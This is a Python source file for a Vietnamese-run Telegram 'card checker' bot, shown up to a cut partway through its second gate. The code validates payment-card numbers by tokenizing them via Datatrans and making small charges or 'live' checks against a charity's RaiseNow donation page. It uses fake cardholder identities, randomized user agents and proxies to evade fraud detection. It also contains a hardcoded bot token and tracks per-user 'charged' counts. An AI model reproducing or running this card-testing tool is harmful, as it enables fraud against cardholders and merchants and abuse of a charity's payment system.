import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
import threading
import random
import psutil # Library for monitoring CPU/RAM
import ssl
import socket
import string
from datetime import datetime
from pytz import timezone
from urllib.parse import urlparse, urljoin
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import commands from site_checker file
from site_checker import site_command, sitem_command

# --- NEW: IMPORT GATE CHECKERS FROM THE 'checkers' DIRECTORY ---
from checkers.gate3_checker import check_card_gate3 
from checkers.gate4_checker import check_card_gate4
from checkers.gate5_checker import check_card_gate5
from checkers.gate6_checker import check_card_gate6
from checkers.gate7_checker import check_card_gate7
from checkers.gate8_checker import check_card_gate8
from checkers.gate9_checker import check_card_gate9
from checkers.gate10_checker import check_card_gate10
from checkers.gate11_checker import check_card_gate11
from checkers.gate12_checker import check_card_gate12
# --- NEW: IMPORT MULTI-LINK CHECKER ---
from checkers.multi_link_checker import check_card_multi_link


# --- CONFIGURATION ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- STORAGE FILES & DIRECTORIES ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json" # Limit for /mass
MULTI_LIMIT_FILE = "multi_limits.json" # Limit for /multi
STATS_FILE = "user_stats.json"
LOG_DIR = "check_logs" # Main directory for logs
BOT_STATUS_FILE = "bot_status.json" # File for bot's on/off status
GATE_FILE = "current_gate.json" # File for the current check gate
GATE_RANGES_FILE = "gate_charge_ranges.json" # File for gate charge ranges
PROXY_FILE = "proxies.json" # File for proxies

# --- NEW: STORAGE FOR MULTI-LINK FEATURE ---
MULTI_LINK_DATA_FILE = "multi_link_data.json" # Stores validated link data
MULTI_LINK_MODE_FILE = "multi_link_mode.json" # Stores mode for multi-link (charge/live)

# --- GATE MODE FILES ---
GATE1_MODE_FILE = "gate1_mode.json"
GATE2_MODE_FILE = "gate2_mode.json"
GATE3_MODE_FILE = "gate3_mode.json"
GATE5_MODE_FILE = "gate5_mode.json"
GATE8_MODE_FILE = "gate8_mode.json"
GATE9_MODE_FILE = "gate9_mode.json"
GATE10_MODE_FILE = "gate10_mode.json"
GATE11_MODE_FILE = "gate11_mode.json"
GATE12_MODE_FILE = "gate12_mode.json"

# --- DEFAULT LIMITS FOR MEMBERS ---
DEFAULT_MEMBER_LIMIT = 100 # For /mass
MEMBER_THREAD_LIMIT = 3 # For /mass
DEFAULT_MULTI_LIMIT = 10 # For /multi

# --- TIMEZONE CONFIGURATION ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- GLOBAL VARIABLES ---
# ACTIVE_CHECKS is now a dict to store more info about running tasks
# {user_id: {"full_name": str, "username": str, "start_time": float, "task_type": str}}
ACTIVE_CHECKS = {}
CANCELLATION_EVENTS = {} # {user_id: threading.Event}
STATS_FILE_LOCK = threading.Lock() # Lock to prevent conflicts when multiple users write to the stats file simultaneously

# --- NOTIFICATION MESSAGES ---
MESSAGES = {
    "bot_off": """üî¥ **TH√îNG B√ÅO B·∫¢O TR√å** üî¥

Bot ƒëang t·∫°m th·ªùi ngo·∫°i tuy·∫øn ƒë·ªÉ b·∫£o tr√¨. C√°c l·ªánh ki·ªÉm tra s·∫Ω b·ªã v√¥ hi·ªáu h√≥a cho ƒë·∫øn khi c√≥ th√¥ng b√°o m·ªõi. C·∫£m ∆°n s·ª± ki√™n nh·∫´n c·ªßa b·∫°n!""",
    "bot_on": """üü¢ **TH√îNG B√ÅO HO·∫†T ƒê·ªòNG TR·ªû L·∫†I** üü¢

Bot ƒë√£ ho·∫°t ƒë·ªông tr·ªü l·∫°i. C·∫£m ∆°n b·∫°n ƒë√£ ch·ªù ƒë·ª£i!""",
}

# --- LOGGING CONFIGURATION ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- INITIALIZATION ---
# Create log directory if it doesn't exist
os.makedirs(LOG_DIR, exist_ok=True)
# Create checkers directory if it doesn't exist
os.makedirs("checkers", exist_ok=True)


# --- USER, DATA & GATE MANAGEMENT ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_multi_limit(user_id):
    limits = load_json_file(MULTI_LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)

def is_bot_on():
    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
    return status.get('is_on', True)

def set_bot_status(is_on: bool):
    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})

def get_active_gate():
    gate_data = load_json_file(GATE_FILE, default_data={'gate': '6'}) # Default is gate 6
    return gate_data.get('gate', '6')

def set_active_gate(gate_id):
    save_json_file(GATE_FILE, {'gate': str(gate_id)})

# --- NEW: Multi-Link Mode Management ---
def get_multi_link_mode():
    """Gets the current mode of the Multi-Link feature."""
    return load_json_file(MULTI_LINK_MODE_FILE, default_data={'mode': 'charge'})

def set_multi_link_mode(mode):
    """Sets the mode for the Multi-Link feature."""
    if mode in ['live', 'charge']:
        save_json_file(MULTI_LINK_MODE_FILE, {'mode': mode})

def load_multi_links():
    """Loads the list of validated links."""
    return load_json_file(MULTI_LINK_DATA_FILE, default_data=[])

def save_multi_links(links_list):
    """Saves the list of validated links."""
    save_json_file(MULTI_LINK_DATA_FILE, links_list)

# --- GATE 1 MODE MANAGEMENT ---
def get_gate1_mode():
    """Gets the current mode of Gate 1 (charge or live)."""
    mode_data = load_json_file(GATE1_MODE_FILE, default_data={'mode': 'live'}) # Default is live
    return mode_data.get('mode', 'live')

def set_gate1_mode(mode):
    """Sets the mode for Gate 1."""
    if mode in ['live', 'charge']:
        save_json_file(GATE1_MODE_FILE, {'mode': mode})

# --- GATE 2 MODE MANAGEMENT ---
def get_gate2_mode():
    """Gets the current mode of Gate 2 (charge or live)."""
    mode_data = load_json_file(GATE2_MODE_FILE, default_data={'mode': 'charge'}) # Default is charge
    return mode_data.get('mode', 'charge')

def set_gate2_mode(mode):
    """Sets the mode for Gate 2."""
    if mode in ['live', 'charge']:
        save_json_file(GATE2_MODE_FILE, {'mode': mode})

# --- GATE 3 MODE MANAGEMENT ---
def get_gate3_mode():
    """Gets the current mode of Gate 3 (charge or live)."""
    mode_data = load_json_file(GATE3_MODE_FILE, default_data={'mode': 'charge'}) # Default is charge
    return mode_data.get('mode', 'charge')

def set_gate3_mode(mode):
    """Sets the mode for Gate 3."""
    if mode in ['live', 'charge']:
        save_json_file(GATE3_MODE_FILE, {'mode': mode})

# --- GATE 5 MODE MANAGEMENT ---
def get_gate5_mode():
    """Gets the current mode of Gate 5 (charge or live)."""
    mode_data = load_json_file(GATE5_MODE_FILE, default_data={'mode': 'charge'}) # Default is charge
    return mode_data.get('mode', 'charge')

def set_gate5_mode(mode):
    """Sets the mode for Gate 5."""
    if mode in ['live', 'charge']:
        save_json_file(GATE5_MODE_FILE, {'mode': mode})

# --- GATE 8 MODE MANAGEMENT ---
def get_gate8_mode():
    """Gets the current mode of Gate 8 (charge or live)."""
    mode_data = load_json_file(GATE8_MODE_FILE, default_data={'mode': 'live'}) # Default is live check
    return mode_data.get('mode', 'live')

def set_gate8_mode(mode):
    """Sets the mode for Gate 8."""
    if mode in ['live', 'charge']:
        save_json_file(GATE8_MODE_FILE, {'mode': mode})

# --- GATE 9 MODE MANAGEMENT ---
def get_gate9_mode():
    """Gets the current mode of Gate 9 (charge or live)."""
    mode_data = load_json_file(GATE9_MODE_FILE, default_data={'mode': 'live'}) # Default is live check
    return mode_data.get('mode', 'live')

def set_gate9_mode(mode):
    """Sets the mode for Gate 9."""
    if mode in ['live', 'charge']:
        save_json_file(GATE9_MODE_FILE, {'mode': mode})

# --- GATE 10 MODE MANAGEMENT ---
def get_gate10_mode():
    """L·∫•y ch·∫ø ƒë·ªô hi·ªán t·∫°i c·ªßa Gate 10 (charge ho·∫∑c live)."""
    mode_data = load_json_file(GATE10_MODE_FILE, default_data={'mode': 'charge'}) # M·∫∑c ƒë·ªãnh l√† charge
    return mode_data.get('mode', 'charge')

def set_gate10_mode(mode):
    """Thi·∫øt l·∫≠p ch·∫ø ƒë·ªô cho Gate 10."""
    if mode in ['live', 'charge']:
        save_json_file(GATE10_MODE_FILE, {'mode': mode})

# --- GATE 11 MODE MANAGEMENT ---
def get_gate11_mode():
    """L·∫•y ch·∫ø ƒë·ªô hi·ªán t·∫°i c·ªßa Gate 11 (charge ho·∫∑c live)."""
    mode_data = load_json_file(GATE11_MODE_FILE, default_data={'mode': 'charge'}) # M·∫∑c ƒë·ªãnh l√† charge
    return mode_data.get('mode', 'charge')

def set_gate11_mode(mode):
    """Thi·∫øt l·∫≠p ch·∫ø ƒë·ªô cho Gate 11."""
    if mode in ['live', 'charge']:
        save_json_file(GATE11_MODE_FILE, {'mode': mode})

# --- GATE 12 MODE MANAGEMENT ---
def get_gate12_mode():
    """L·∫•y ch·∫ø ƒë·ªô hi·ªán t·∫°i c·ªßa Gate 12 (charge ho·∫∑c live)."""
    mode_data = load_json_file(GATE12_MODE_FILE, default_data={'mode': 'charge'}) # M·∫∑c ƒë·ªãnh l√† charge
    return mode_data.get('mode', 'charge')

def set_gate12_mode(mode):
    """Thi·∫øt l·∫≠p ch·∫ø ƒë·ªô cho Gate 12."""
    if mode in ['live', 'charge']:
        save_json_file(GATE12_MODE_FILE, {'mode': mode})


def _get_charge_value(gate_id, custom_charge_amount=None):
    """Gets the charge value: priority is custom_amount, then range, finally default."""
    if custom_charge_amount is not None:
        return custom_charge_amount

    # For multi-link mode, we can set a specific default or range
    if str(gate_id) == 'dalink':
        ranges = load_json_file(GATE_RANGES_FILE)
        gate_range = ranges.get('dalink')
        if gate_range and 'min' in gate_range and 'max' in gate_range:
             try:
                return random.randint(int(gate_range['min']), int(gate_range['max']))
             except (ValueError, TypeError):
                return 50 # Default 0.5$ if range is faulty
        return 50 # Default 0.5$ for multi-link mode

    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))

    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            return random.randint(int(gate_range['min']), int(gate_range['max']))
        except (ValueError, TypeError):
            logger.warning(f"Error reading range for gate {gate_id}, using default. Range: {gate_range}")
            return 50 # Default 0.5$ if range is faulty

    return 50 # Default 0.5$ for other gates

def get_formatted_gate_name(gate_id):
    """Gets the formatted gate name with charge info."""
    
    # --- NEW: Handle multi-link mode display name ---
    if str(gate_id) == 'dalink':
        mode_data = get_multi_link_mode()
        mode = mode_data.get('mode', 'charge').title()
        return f"üî• Multi-Link ({mode})"

    if str(gate_id) == '7':
        return "Check Live (Gate 7)"

    if str(gate_id) == '1':
        gate1_mode = get_gate1_mode()
        if gate1_mode == 'live':
            return "Check Live (Gate 1)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 1)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 1)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 1)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    if str(gate_id) == '2':
        gate2_mode = get_gate2_mode()
        if gate2_mode == 'live':
            return "Check Live (Gate 2)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 2)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 2)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 2)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    if str(gate_id) == '3':
        gate3_mode = get_gate3_mode()
        if gate3_mode == 'live':
            return "Check Live (Gate 3)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 3)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 3)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 3)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    if str(gate_id) == '4':
        default_name = "Charge 0.5$ Year (Gate 4)"
        ranges = load_json_file(GATE_RANGES_FILE)
        gate_range = ranges.get(str(gate_id))

        if gate_range and 'min' in gate_range and 'max' in gate_range:
            try:
                min_val = int(gate_range['min']) / 100
                max_val = int(gate_range['max']) / 100
                if min_val == max_val:
                    return f"Charge {min_val:.2f}$ Year (Gate 4)"
                else:
                    return f"Charge {min_val:.2f}$-{max_val:.2f}$ Year (Gate 4)"
            except (ValueError, TypeError):
                return default_name
        return default_name
    
    if str(gate_id) == '5':
        gate5_mode = get_gate5_mode()
        if gate5_mode == 'live':
            return "Check Live (Gate 5)"
        else: # Charge mode
            default_name = "Charge 0.5$ Mounth (Gate 5)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ Mounth (Gate 5)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ Mounth (Gate 5)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    if str(gate_id) == '8':
        gate8_mode = get_gate8_mode()
        if gate8_mode == 'live':
            return "Check Live (Gate 8)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 8)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 8)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 8)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    if str(gate_id) == '9':
        gate9_mode = get_gate9_mode()
        if gate9_mode == 'live':
            return "Check Live (Gate 9)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 9)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 9)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 9)"
                except (ValueError, TypeError):
                    return default_name
            return default_name
    
    if str(gate_id) == '10':
        gate10_mode = get_gate10_mode()
        if gate10_mode == 'live':
            return "Check Live (Gate 10)"
        else: # Charge mode
            default_name = "Charge 0.5$ Month (Gate 10)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ Month (Gate 10)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ Month (Gate 10)"
                except (ValueError, TypeError):
                    return default_name
            return default_name
            
    if str(gate_id) == '11':
        gate11_mode = get_gate11_mode()
        if gate11_mode == 'live':
            return "Check Live V11 (Gate 11)"
        else: # Charge mode
            default_name = "Charge 0.5$ V11 (Gate 11)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ V11 (Gate 11)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ V11 (Gate 11)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    if str(gate_id) == '12':
        gate12_mode = get_gate12_mode()
        if gate12_mode == 'live':
            return "Check Live V12 (Gate 12)"
        else: # Charge mode
            default_name = "Charge 0.5$ V12 (Gate 12)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ V12 (Gate 12)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ V12 (Gate 12)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    default_names = {
        '6': "Charge 0.5$ (Gate 6)",
    }
    
    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))

    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            min_val = int(gate_range['min']) / 100
            max_val = int(gate_range['max']) / 100
            if min_val == max_val:
                return f"Charge {min_val:.2f}$ (Gate {gate_id})"
            else:
                return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate {gate_id})"
        except (ValueError, TypeError):
            return default_names.get(gate_id, f"Unknown Gate {gate_id}")
    else:
        return default_names.get(gate_id, f"Unknown Gate {gate_id}")


def update_user_stats(user_id, user_info, counts):
    # Use lock to ensure safety when multiple threads update the file
    with STATS_FILE_LOCK:
        stats = load_json_file(STATS_FILE)
        user_id_str = str(user_id)

        default_user_stat = {
            'username': None, 'full_name': None, 'total_charged': 0, 'total_custom': 0, 'total_live_success': 0,
            'total_decline': 0, 'total_error': 0, 'total_invalid': 0, 'last_check_timestamp': ''
        }
        user_stat_data = stats.get(user_id_str, {})
        if isinstance(user_stat_data, dict):
            default_user_stat.update(user_stat_data)

        stats[user_id_str] = default_user_stat

        stats[user_id_str]['total_charged'] += counts.get('success', 0)
        stats[user_id_str]['total_live_success'] += counts.get('live_success', 0)
        stats[user_id_str]['total_custom'] += counts.get('custom', 0)
        stats[user_id_str]['total_decline'] += counts.get('decline', 0)
        stats[user_id_str]['total_error'] += counts.get('error', 0) + counts.get('gate_dead', 0)
        stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
        stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
        stats[user_id_str]['username'] = user_info.username
        stats[user_id_str]['full_name'] = user_info.full_name

        save_json_file(STATS_FILE, stats)

# --- PROXY MANAGEMENT FUNCTIONS ---
def load_proxies():
    """Loads the proxy list and status from a JSON file."""
    return load_json_file(PROXY_FILE, default_data={"enabled": False, "proxies": []})

def save_proxies(data):
    """Saves the proxy list and status to a JSON file."""
    save_json_file(PROXY_FILE, data)

def _format_proxy_for_requests(proxy_str):
    """Converts a proxy string to a dict format for the requests library."""
    if not proxy_str:
        return None
    parts = proxy_str.strip().split(':')
    # ip:port
    if len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    # ip:port:user:pass
    elif len(parts) == 4:
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    else:
        logger.warning(f"Invalid proxy format: {proxy_str}")
        return None

def _test_proxy(proxy_str: str):
    """Tests a proxy by connecting to google.com."""
    proxy_dict = _format_proxy_for_requests(proxy_str)
    if not proxy_dict:
        return False, "Invalid proxy format."
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=7)
        if 200 <= response.status_code < 300:
            return True, f"Success (Status: {response.status_code})"
        else:
            return False, f"Failed (Status: {response.status_code})"
    except requests.exceptions.ProxyError as e:
        return False, f"Proxy Error: {e}"
    except requests.exceptions.RequestException as e:
        return False, f"Connection Error: {e}"
# --- END PROXY FUNCTIONS ---

# --- CORE FUNCTIONS ---

def generate_random_string(length=8):
    """Generates a random string of characters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Generates a random email address."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_birth_day():
    """Generates a random day for birthday (1-28)."""
    return str(random.randint(1, 28)).zfill(2)

def random_birth_month():
    """Generates a random month for birthday (1-12)."""
    return str(random.randint(1, 12)).zfill(2)

def random_birth_year():
    """Generates a random year for birthday (1970-2005)."""
    return str(random.randint(1970, 2005))


def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    win_build = random.randint(10000, 22631)
    win_patch = random.randint(0, 500)
    webkit_major = random.randint(537, 605) # Increased range for more variability
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            # **kwargs can contain 'proxies' if passed from check_card
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "Card Number (CC) must be 10-19 digits."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Month (MM) must be a number from 1 to 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "Year (YY) must be 2 or 4 digits."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV must be 3 or 4 digits."
    return True, ""

def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """Logic for Gate 1 - Charge or Live Check Mode"""
    gate1_mode = get_gate1_mode()
    try:
        user_agent = random_user_agent()
        
        # Random personal info
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()
        birth_day = random_birth_day()
        birth_month = random_birth_month()
        birth_year = random_birth_year()

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250806042656273071",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        
        base_payload = {
            "account_uuid": "01bd7c99-eefc-42d2-91e4-4a020f6b5cfc",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "birth_day": birth_day,
                "birth_month": birth_month,
                "birth_year": birth_year
            },
            "raisenow_parameters": {
                "analytics": {"channel": "paylink", "user_agent": user_agent},
                "solution": {"uuid": "75405349-f0b9-4bed-9d28-df297347f272", "name": "Patenschaft Hundeabteilung", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/ynddy?lng=en", "uuid": "self-service", "version": "2.16.0"}
            },
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "110885c2-a1e8-47b7-a2af-525ad6ab8ca6",
            "return_url": "https://donate.raisenow.io/ynddy?lng=en&rnw-view=payment_result",
        }

        # --- CHARGE MODE ---
        if gate1_mode == 'charge':
            charge_value = _get_charge_value('1', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
            # Remove subscription part for charge mode
            payment_payload.pop("subscription", None)

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        # --- LIVE CHECK MODE (ORIGINAL LOGIC) ---
        else:
            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}
            payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 1 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 1 System Error: {e}", bin_info

def _check_card_gate2(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """Logic for Gate 2 - Charge or Live Check Mode"""
    gate2_mode = get_gate2_mode()
    try:
        user_agent = random_user_agent()
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"

        # Step 1: Tokenize card
